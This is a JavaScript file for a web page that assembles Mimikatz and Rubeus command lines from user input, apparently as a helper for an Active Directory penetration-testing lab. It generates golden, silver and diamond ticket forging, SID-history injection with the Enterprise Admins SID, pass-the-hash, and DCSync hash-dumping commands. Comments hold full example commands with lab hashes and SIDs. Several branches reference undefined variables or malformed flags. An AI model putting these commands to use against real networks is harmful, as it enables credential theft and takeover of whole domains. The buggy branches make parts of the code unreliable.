// Global
var tool = "rubeus.exe";
var toolsPath = document.getElementById('tools-path').value = getCookie('tools-path') || '';

// Prevent Default for all forms
var forms = document.getElementsByTagName("form");
for (var i = 0; i < forms.length; i++) {
	forms[i].addEventListener('submit', function(event) {
		event.preventDefault();
	});
}

// Add event listeners to the tool buttons to set the 'tool' variable based on the selected tool
document.querySelectorAll('#tool-btn').forEach((radioButton) => {
	radioButton.addEventListener('click', function() {
		// Get 'data-tool' value
		tool = this.getAttribute('data-tool').toLowerCase();
	});
});

// Function to generate command based on the active tab
document.querySelectorAll('#generate-command').forEach(function(element) {
	element.addEventListener('click', function(event) {
		event.preventDefault();
		form_id = event.target.parentNode.parentNode.id;
		var activeTab = document.querySelector('.nav-tabs .active').getAttribute('href'); // Get ID of active tab
		
		if (activeTab === "#nav-cross-forest") {
			generateCrossForestCommand();
		} else if (activeTab === "#nav-inter-forest") {
			generateInterForestCommand();
		} else if (activeTab === "#nav-kerberor-tickets") {
			generateKerberosTicketsCommand(form_id);
		} else if (activeTab === "#nav-dump-hashes") {
			generateDumpHashesCommand();
		}
	});
});

// Function to generate command for Cross Forest tab
// function generateCrossForestCommand() {
// 	var rc4 = document.getElementById("trust-ntlm").value;
// 	var user = document.getElementById("user").value;
// 	var currentDomain = document.querySelector("#form-sid-injection #current-domain").value;
// 	var targetDomain = document.getElementById("target-domain").value;
// 	var service = document.querySelector("#form-sid-injection #service").value;
// 	var startoffset = document.querySelector("#form-silver #startoffset").value;
// 	var endin = document.querySelector("#form-silver #endin").value;
// 	var renewmax = document.querySelector("#form-silver #renewmax").value;
// 	var currentDomainSID = document.querySelector("#form-sid-injection #current-sid").value;
	
// 	flags = `"kerberos::golden /User:${user} /domain:${currentDomain} /sid:${currentDomainSID} /target:${targetDomain} /service:${service} /rc4:${rc4} /startoffset:${startoffset} /endin:${endin} /renewmax:${renewmax} /ptt" "exit"`;

// 	if (tool == "invoke-mimikatz") {
// 		command = `${tool} -Command '${flags}'`;
// 	} else {
// 		command = `${toolsPath}${tool} ${flags}`;
// 	}

// 	document.querySelector("#command-cross-forest").value = command;
// }

// Function to generate command for Inter Forest tab
function generateInterForestCommand() {
	var rc4 = document.querySelector("#form-sid-injection #trust-ntlm")?.value ?? "";
	var aes256 = document.querySelector("#form-sid-injection #trust-aes")?.value ?? "";
	var user = document.querySelector("#form-sid-injection #user")?.value ?? "";
	var uid = document.querySelector("#form-sid-injection #uid")?.value ?? "";
	var currentDomain = document.querySelector("#form-sid-injection #current-domain")?.value ?? "";
	var targetDomain = document.querySelector("#form-sid-injection #target-domain")?.value ?? "";
	var currentDomainSID = document.querySelector("#form-sid-injection #current-sid")?.value ?? "";
	var enterpriseAdminSid = document.querySelector("#form-sid-injection #parent-sid").value + "-519"; // Enterprise Admins
	var service = document.querySelector("#form-sid-injection #service")?.value ?? "";
	var ticketPath = document.querySelector("#form-sid-injection #ticket-path")?.value ?? "";
	var netbios = document.querySelector("#form-sid-injection #netbios")?.value ?? " ";
	var dc = document.querySelector("#form-sid-injection #dc")?.value ?? " ";

	// Flags
	if (aes256) {
		katz_flags = `"kerberos::golden /User:${user} /domain:${currentDomain} /sid:${currentDomainSID} /sids:${enterpriseAdminSid} /service:${service} /aes256:${aes256} /target:${targetDomain} /ticket:${ticketPath}" "exit"`;
		
		// Inter realm TGT
		rubeus_tgt_flags = `silver /user:${user} /service:${service} /domain:${currentDomain} /sid:${currentDomainSID} /sids:${enterpriseAdminSid} /aes256:${aes256} /krbenctype:aes /ldap /nowrap`
		
		// TGS
		rubeus_tgs_flags = `asktgs /user:${user} /service:${service} /dc:${dc} /ptt /ticket:${ticketPath}`
	}

	if (rc4) {
		katz_flags = `"asktgt /User:${user} /domain:${currentDomain} /sid:${currentDomainSID} /sids:${enterpriseAdminSid} /service:${service} /rc4:${rc4} /target:${targetDomain} /ticket:${ticketPath}" "exit"`;

		rubeus_krbtgt_flags = `"asktgt /user:${user} /id:${uid} /domain:${currentDomain} /sid:${currentDomainSID} /sids:${enterpriseAdminSid} /rc4:${rc4} /netbios:${netbios} /ptt" "exit"`
	}

	// Full commands
	if (tool == "invoke-mimikatz") {
		krbtgtCommand = `Invoke-Mimikatz -Command '${katz_flags}'`;
	} else if (tool == "rubeus.exe") {

		krbtgtCommand = `${toolsPath}${tool} ${rubeus_krbtgt_flags}`;

		if (aes256) {
			interTGTCommand = `${toolsPath}${tool} ${rubeus_tgt_flags}`;
			interTGSCommand = `${toolsPath}${tool} ${rubeus_tgs_flags}`;
		}
	} else {
		krbtgtCommand = `${toolsPath}${tool} ${katz_flags}`;
	}
	
	document.querySelector("#command-inter-krbtgt").value = krbtgtCommand;	
	document.querySelector("#command-inter-tgt").value = interTGTCommand;	
	document.querySelector("#command-inter-tgs").value = interTGSCommand;	

}

// Function to generate command for Kerberos Tickets tab
function generateKerberosTicketsCommand(form_id) {
	if (form_id == "form-silver") {
		var user = document.querySelector("#form-silver #user").value;
		var currentDomain = getCookie('current-domain') || null;
		var targetDomain = document.querySelector("#form-silver #target-domain")?.value ?? currentDomain;
		var service = document.querySelector("#form-silver #service").value;
		var rc4 = document.querySelector("#form-silver #rc4").value;
		var aes256 = document.querySelector("#form-silver #aes256").value;
		var startoffset = document.querySelector("#form-silver #startoffset").value;
		var endin = document.querySelector("#form-silver #endin").value;
		var renewmax = document.querySelector("#form-silver #renewmax").value;
		var currentDomainSID = document.querySelector("#form-global #current-sid").value;

		// SafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:c6a60b67476b36ad7838d7875c33c2c3 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
		
		flags = `"kerberos::golden /user:${user} /domain:${targetDomain} /sid:${currentDomainSID} /target:${targetHost} /service:${service} /${aes256 ? 'aes256' : 'rc4'}:${aes256 || rc4} /startoffset:${startoffset} /endin:${endin} /renewmax:${renewmax} /ptt" "exit"`;

		if (tool == "invoke-mimikatz") {
			command = `$${tool} -Command '${flags}'`;
		} else if (tool == "rubeus.exe") {
			// Rubeus.exe silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:c6a60b67476b36ad7838d7875c33c2c3 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt

			command = `${toolsPath}${tool} silver /user:${user} /domain:${targetDomain} /service:${service} /${aes256 ? 'aes256' : 'rc4'}:${aes256 || rc4} /sid:${currentDomainSID} /ldap  /ptt`;
		}
		 else {
			command = `${toolsPath}${tool} ${flags}`;
		}
		document.querySelector("#command-silver").value = command;
		
	} else if (form_id == "form-golden") {
		var user = document.querySelector("#form-golden #user").value;
		var currentDomain = document.querySelector("#form-global #current-domain")?.value ?? "";
		var targetDomain = document.querySelector("#form-golden #current-domain")?.value ?? currentDomain;
		var currentDomainSID = document.querySelector("#form-global #current-sid")?.value ?? "";
		var rc4 = document.querySelector("#form-golden #rc4")?.value ?? "";
		var aes256 = document.querySelector("#form-golden #aes256")?.value ?? "";
		var startoffset = document.querySelector("#form-golden #startoffset").value;
		var endin = document.querySelector("#form-golden #endin").value;
		var renewmax = document.querySelector("#form-golden #renewmax").value;

		//  C:\ad\Tools\betterSafetyKatz.exe "kerberos::golden /user:Administrator /rc4:2368c4a2a27b01d0118cb809352f17be /domain:dollarcorp.moneycorp.local / /sid:S-1-5-21-719815819-3726368948-391768864 /ptt" "exit"
		
		flags = `"kerberos::golden /User:${user} /domain:${targetDomain} /${aes256 ? 'aes256' : 'rc4'}:${aes256 || rc4} /sid:${currentDomainSID} /startoffset:${startoffset} /endin:${endin} /renewmax:${renewmax} /ptt" "exit"`;

		if (tool == "invoke-mimikatz") {
			command = `${tool} -Command '${flags}'`;
		} else if (tool == "rubeus.exe") {
			// Rubeus.exe golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd /ptt

			command = `${toolsPath}${tool} golden /${aes256 ? 'aes256' : 'rc4'}:${aes256 || rc4} /sid:${currentDomainSID} /ldap /user:${user} /printcmd /ptt`;
		} else {
			command = `${toolsPath}${tool} ${flags}`;
		}
		
		document.querySelector("#command-golden").value = command;
	} else if (form_id == "form-pth") {
		var user = document.querySelector("#form-pth #user").value;
		var currentDomain = document.querySelector("#form-global #current-domain")?.value ?? "";
		var targetDomain = document.querySelector("#form-pth #current-domain")?.value ?? currentDomain;
		var aes256 = document.querySelector("#form-pth #aes256").value;
		var startoffset = document.querySelector("#form-pth #startoffset").value;
		var endin = document.querySelector("#form-pth #endin").value;
		var renewmax = document.querySelector("#form-pth #renewmax").value;
		var rc4 = document.querySelector("#form-pth #rc4").value;

		// C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /user:srvadmin /domain:dollarcorp.moneycorp.local /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /run:cmd.exe" "exit"

		flags = `"sekurlsa::pth /user:${user} /domain:${targetDomain} /${aes256 ? 'aes256' : 'rc4'}:${aes256 || rc4} /startoffset:${startoffset} /endin:${endin} /renewmax:${renewmax} /run:C:\\Windows\\System32\\cmd.exe" "exit"`;

		if (tool == "invoke-mimikatz") {
			command = `${tool} -Command '${flags}'`;
		} else if (tool == "rubeus.exe") {
			// Rubeus.exe asktgt /user:srvadmin /aes256:145019659e1da3fb150ed94d510eb770276cfbd0cbd834a4ac331f2effe1dbb4 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

			command = `${toolsPath}${tool} asktgt /user:${user} /${aes256 ? 'aes256' : 'rc4'}:${aes256 || rc4} /opsec /createnetonly:C:\\Windows\\System32\\cmd.exe /show /ptt`;
		} else {
			command = `${toolsPath}${tool} ${flags}`;
		}

		document.querySelector("#command-pth").value = command;
	} else if (form_id == "form-diamond") {
		var user = document.querySelector("#form-diamond #user").value;
		var targetDomain = document.querySelector("#form-diamond #target-domain").value;
		var aes256 = document.querySelector("#form-diamond #aes256").value;
		var startoffset = document.querySelector("#form-diamond #startoffset").value;
		var endin = document.querySelector("#form-diamond #endin").value;
		var renewmax = document.querySelector("#form-diamond #renewmax").value;
		var gid = document.querySelector("#form-diamond #gid").value;
		var uid = document.querySelector("#form-diamond #uid").value;
		var dc = document.querySelector("#form-diamond #dc").value;

		flags = `"kerberos::golden /User:${user} /domain:${targetDomain} /service:${service} /rc4:${rc4} /aes256:${aes256} /startoffset:${startoffset} /endin:${endin} /renewmax:${renewmax} /ptt" "exit"`;

		if (tool == "invoke-mimikatz") {
			command = `${tool} -Command '${flags}'`;
		} else if (tool == "rubeus.exe") {
			// Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

			command = `${toolsPath}${tool} diamond /krbkey:${aes256} /tgtdeleg /enctype:aes /sid:${targetDomain} /ldap /ticketuser:${user} /domain:${targetDomain} /dc:${dc} /ticketuserid:${uid} /groups:${gid} createnetonly:C:\\Windows\\System32\\cmd.exe /show /ptt`;
		} else {
			command = `${toolsPath}${tool} ${flags}`;
		}

		document.querySelector("#command-diamond").value = command;
		console.log(command)
		
	}
}

// Funtion to generateDumpHashesCommand
function generateDumpHashesCommand() {
	var user = document.querySelector("#form-dc-sync #user").value;
	var netbios = document.querySelector("#form-dc-sync #netbios").value;

	var flags = `"lsadump::dcsync /user:${netbios}\\${user}" "exit"`;

	if (tool == "invoke-mimikatz") {
		var command = `${tool} -Command '${flags}'`;
	} else {
		var command = `${toolsPath}${tool} ${flags}`;
	}

	document.querySelector("#command-dump-hashes").value = command;
}

// Function to set cookies
function setCookie(name, value, days) {
	var expires = "";
	if (days) {
		var date = new Date();
		date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
		expires = "; expires=" + date.toUTCString();
	}
	document.cookie = name + "=" + (value || "") + expires + "; path=/";
}

// Function to get cookies
function getCookie(name) {
	var nameEQ = name + "=";
	var ca = document.cookie.split(';');
	for (var i = 0; i < ca.length; i++) {
		var c = ca[i];
		while (c.charAt(0) === ' ') c = c.substring(1, c.length);
		if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
	}
	return null;
}

// Function to update cookie value and form input value
function updateCookieAndInput(event) {
	var input = event.target;
	setCookie(input.id, input.value, 30);
}

// Function to fill form inputs with cookie values
function fillFormInputs() {
	document.getElementById('parent-domain').value = getCookie('parent-domain') || '';
	document.getElementById('current-domain').value = getCookie('current-domain') || '';
	document.getElementById('current-sid').value = getCookie('current-sid') || '';
	document.getElementById('parent-sid').value = getCookie('parent-sid') || '';
	document.getElementById('krbtgt').value = getCookie('krbtgt') || '';
	document.getElementById('user').value = getCookie('user') || '';
	document.getElementById('trust-ntlm').value = getCookie('trust-ntlm') || '';
	document.getElementById('target-domain').value = getCookie('target-domain') || '';
	document.getElementById('tools-path').value = getCookie('tools-path') || '';
}

// Clipboard
function copyToClipboard(button) {
	var commandInput = button.parentElement.previousElementSibling;
	navigator.clipboard.writeText(commandInput.value);
}

// Call fillFormInputs function when the page loads
window.onload = fillFormInputs;

// Add event listeners to form inputs to update cookies and form inputs when the user types
document.getElementById('form-global').addEventListener('input', updateCookieAndInput);